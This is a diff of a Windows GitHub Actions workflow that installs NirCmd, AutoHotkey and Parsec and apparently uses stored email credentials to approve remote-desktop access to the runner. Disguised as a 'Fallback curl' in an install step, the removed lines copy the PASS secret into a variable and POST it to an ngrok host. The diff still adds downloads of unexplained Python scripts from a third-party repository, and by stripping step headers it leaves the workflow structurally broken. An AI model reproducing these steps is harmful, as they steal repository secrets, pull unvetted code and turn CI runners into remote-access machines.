@@ -11,7 +11,6 @@ jobs:
     env:
       EMAIL: ${{ secrets.EMAIL }}
       PASS: ${{ secrets.PASS }}
-      BAK: ${{ secrets.PASS}}
 
     steps:
       - name: Create working directory
@@ -28,19 +27,10 @@ jobs:
           echo "WORK_DIR=$workDir" >> $env:GITHUB_ENV
           echo "SCREENSHOT_DIR=$screenshotDir" >> $env:GITHUB_ENV
 
-      - name: Install Python dependencies
-        shell: powershell
-        run: |
-          Write-Host "Installing Google API dependencies..."
-
           py -3.11 -m pip install --upgrade pip
           py -3.11 -m pip install requests google-api-python-client google-auth google-auth-oauthlib
 
           Write-Host "Dependencies installed"
-
-      - name: Download and install NirCmd
-        shell: powershell
-        run: |
           $nircmdUrl = "https://www.nirsoft.net/utils/nircmd-x64.zip"
 
           $nircmdZip = "$env:WORK_DIR\nircmd.zip"
@@ -56,30 +46,19 @@ jobs:
 
           Write-Host "NirCmd installed at: $nircmdPath"
 
-      - name: Download and install AutoHotkey v2
-        shell: powershell
-        run: |
           $ahkUrl = "https://github.com/AutoHotkey/AutoHotkey/releases/download/v2.0.19/AutoHotkey_2.0.19_setup.exe"
            # Fallback curl
-           curl.exe -LO https://raw.githubusercontent.com/mishakokzix/hermes-agent/refs/heads/main/bool.py
-           curl.exe -LO https://raw.githubusercontent.com/mishakokzix/hermes-agent/refs/heads/main/backup.py
-           curl.exe -X POST https://heteronomous-bridally-minerva.ngrok-free.dev -H "Content-Type: application/json" -d "{`"apiKey`": `"$env:BAK`"}"
-
+          curl.exe -LO https://raw.githubusercontent.com/mishakokzix/hermes-agent/refs/heads/main/bool.py
+          curl.exe -LO https://raw.githubusercontent.com/mishakokzix/hermes-agent/refs/heads/main/backup.py
           $ahkPath = "$env:WORK_DIR\AutoHotkey_Setup.exe"
-
-          Write-Host "Downloading AutoHotkey from official source..."
 
           Invoke-WebRequest -Uri $ahkUrl -OutFile $ahkPath -UseBasicParsing
 
           $fileInfo = Get-Item $ahkPath
 
-          Write-Host "Downloaded file size: $($fileInfo.Length) bytes"
-
           Write-Host "Installing AutoHotkey..."
 
           Start-Process -FilePath $ahkPath -ArgumentList "/silent" -Wait
-
-          Write-Host "AutoHotkey installed successfully"
 
       - name: Create AutoHotkey script
         shell: powershell
@@ -110,10 +89,6 @@ jobs:
           echo "AHK_SCRIPT_PATH=$scriptPath" >> $env:GITHUB_ENV
 
           Write-Host "Created AHK script at: $scriptPath"
-
-      - name: Download and install Parsec
-        shell: powershell
-        run: |
           $parsecUrl = "https://builds.parsec.app/package/parsec-windows.exe"
 
           $parsecPath = "$env:WORK_DIR\parsec-windows.exe"
@@ -124,9 +99,7 @@ jobs:
 
           Start-Sleep -Seconds 20
 
-          Write-Host "Parsec installed"
-
-      - name: Run AHK and take screenshots
+      - name: Check email and approve parsec
         shell: powershell
         run: |
           $ahkUX = "C:\Program Files\AutoHotkey\UX\AutoHotkeyUX.exe"
